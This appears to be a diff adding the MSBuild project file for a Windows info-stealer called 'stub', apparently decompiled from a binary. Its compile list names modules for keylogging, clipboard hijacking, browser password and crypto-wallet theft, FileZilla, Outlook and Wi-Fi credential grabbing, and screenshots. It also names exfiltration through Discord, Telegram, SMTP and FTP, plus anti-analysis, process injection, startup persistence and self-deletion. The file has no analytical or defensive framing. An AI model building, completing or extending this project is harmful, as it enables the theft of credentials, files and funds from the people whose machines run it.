@@ -1,0 +1,179 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2CD580CE-3226-47A8-9B1B-0089EEA66219}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>stub</RootNamespace>
+    <AssemblyName>stub</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Stub.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="ICSharpCode.SharpZipLib" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Newtonsoft.Json" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="-Module-{4CD3688D-E116-4A24-A003-6C30CFCDDF34}.cs" />
+    <Compile Include="BerkelyParser.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="dg3ypDAonQcOidMs0w\WP6RZJql8gZrNhVA9v.cs" />
+    <Compile Include="oRZtxCaSAYh6EEGEIZ\Idt5pgryuYoFVQiX6j.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="rE4lpnT863QnijKQK5\hHEYokUTtehNq5ji0d.cs" />
+    <Compile Include="Stub\AesGcm.cs" />
+    <Compile Include="Stub\AntiAnalysis.cs" />
+    <Compile Include="Stub\ASN1DER.cs" />
+    <Compile Include="Stub\BCryptInternalStructs.cs" />
+    <Compile Include="Stub\BCryptNativeMethods.cs" />
+    <Compile Include="Stub\BrowserCrypto.cs" />
+    <Compile Include="Stub\BrowserWalletExtensionsHelper.cs" />
+    <Compile Include="Stub\BrowserWallets.cs" />
+    <Compile Include="Stub\ChromiumRecovery.cs" />
+    <Compile Include="Stub\ClipLogger.cs" />
+    <Compile Include="Stub\Clipper.cs" />
+    <Compile Include="Stub\CommandHelper.cs" />
+    <Compile Include="Stub\Config.cs" />
+    <Compile Include="Stub\Counter.cs" />
+    <Compile Include="Stub\DataExtractionStructs.cs" />
+    <Compile Include="Stub\DesktopWallets.cs" />
+    <Compile Include="Stub\Discord.cs" />
+    <Compile Include="Stub\DiscordSendLogs.cs" />
+    <Compile Include="Stub\Downloader.cs" />
+    <Compile Include="Stub\FileGrabber.cs" />
+    <Compile Include="Stub\Filemanager.cs" />
+    <Compile Include="Stub\FileZilla.cs" />
+    <Compile Include="Stub\Flags.cs" />
+    <Compile Include="Stub\FoxMail.cs" />
+    <Compile Include="Stub\FtpSendLogs.cs" />
+    <Compile Include="Stub\GeckoDecrypto.cs" />
+    <Compile Include="Stub\GeckoRecovery.cs" />
+    <Compile Include="Stub\GrabbedFiles.cs" />
+    <Compile Include="Stub\GrabberUpload.cs" />
+    <Compile Include="Stub\HeavensGate.cs" />
+    <Compile Include="Stub\InternalStructs.cs" />
+    <Compile Include="Stub\InternalStructs32.cs" />
+    <Compile Include="Stub\InternalStructs64.cs" />
+    <Compile Include="Stub\Keylogger.cs" />
+    <Compile Include="Stub\Logging.cs" />
+    <Compile Include="Stub\Melt.cs" />
+    <Compile Include="Stub\MutexControl.cs" />
+    <Compile Include="Stub\NativeMethods.cs" />
+    <Compile Include="Stub\Outlook.cs" />
+    <Compile Include="Stub\PasswordBasedDecryption.cs" />
+    <Compile Include="Stub\Paths.cs" />
+    <Compile Include="Stub\PBKDF2.cs" />
+    <Compile Include="Stub\Program.cs" />
+    <Compile Include="Stub\Properties\Resources.cs" />
+    <Compile Include="Stub\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Stub\RegexPatterns.cs" />
+    <Compile Include="Stub\Reports.cs" />
+    <Compile Include="Stub\Screenshot.cs" />
+    <Compile Include="Stub\SelfDestruct.cs" />
+    <Compile Include="Stub\SharpInjector.cs" />
+    <Compile Include="Stub\SmtpSendLogs.cs" />
+    <Compile Include="Stub\SpecialNativeMethods.cs" />
+    <Compile Include="Stub\SqlLite3Parser.cs" />
+    <Compile Include="Stub\StartDelay.cs" />
+    <Compile Include="Stub\Startup.cs" />
+    <Compile Include="Stub\StringsCrypt.cs" />
+    <Compile Include="Stub\SystemInfo.cs" />
+    <Compile Include="Stub\Telegram.cs" />
+    <Compile Include="Stub\TelegramSendLogs.cs" />
+    <Compile Include="Stub\TripleDES.cs" />
+    <Compile Include="Stub\UploadToDiscord.cs" />
+    <Compile Include="Stub\UploadToFtp.cs" />
+    <Compile Include="Stub\UploadToSmtp.cs" />
+    <Compile Include="Stub\UploadToTelegram.cs" />
+    <Compile Include="Stub\Utils.cs" />
+    <Compile Include="Stub\Utils32.cs" />
+    <Compile Include="Stub\Utils64.cs" />
+    <Compile Include="Stub\Wifi.cs" />
+    <Compile Include="Stub\WinScp.cs" />
+    <Compile Include="Stub\ZipManager.cs" />
+    <Compile Include="stub_ProcessedByFody.cs" />
+    <Compile Include="wnAvGk2ZDkNgZ882lP8\GW7CRbzbOLtfg2w4jV.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" />
+    <EmbeddedResource Include="Costura\costura\dll.compressed" />
+    <EmbeddedResource Include="Costura\costura\pdb.compressed" />
+    <EmbeddedResource Include="Costura\icsharpcode\sharpziplib\dll.compressed" />
+    <EmbeddedResource Include="Costura\icsharpcode\sharpziplib\pdb.compressed" />
+    <EmbeddedResource Include="Costura\metadata" />
+    <EmbeddedResource Include="Costura\newtonsoft\json\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\diagnosticsource\dll.compressed" />
+    <EmbeddedResource Include="q6IevjT37XvTQ9GOTR.QxNhac1QlK0N5pJp0C" />
+    <EmbeddedResource Include="Resources.AppIcon" />
+    <EmbeddedResource Include="Resources.BuildVersion" />
+    <EmbeddedResource Include="Resources.Comments" />
+    <EmbeddedResource Include="Resources.CompanyName" />
+    <EmbeddedResource Include="Resources.FileDescription" />
+    <EmbeddedResource Include="Resources.InternalName" />
+    <EmbeddedResource Include="Resources.LegalCopyright" />
+    <EmbeddedResource Include="Resources.Manifest" />
+    <EmbeddedResource Include="Resources.OriginalFilename" />
+    <EmbeddedResource Include="Resources.PrivateBuild" />
+    <EmbeddedResource Include="Resources.ProductName" />
+    <EmbeddedResource Include="Resources.ProductVersion" />
+    <EmbeddedResource Include="Resources.SYS_NET_CONNECT" />
+    <EmbeddedResource Include="Resources.SYS_SEC_SCAN" />
+    <EmbeddedResource Include="Resources.SYS_SVC_PAUSE" />
+    <EmbeddedResource Include="Resources.SYS_SVC_RESUME" />
+    <EmbeddedResource Include="Resources.SYS_SVC_START" />
+    <EmbeddedResource Include="Resources.SYS_SVC_STOP" />
+    <EmbeddedResource Include="Resources.SYS_UPDATE_CHECK" />
+    <EmbeddedResource Include="Stub\g.resources" />
+    <EmbeddedResource Include="Stub\Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Stub\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
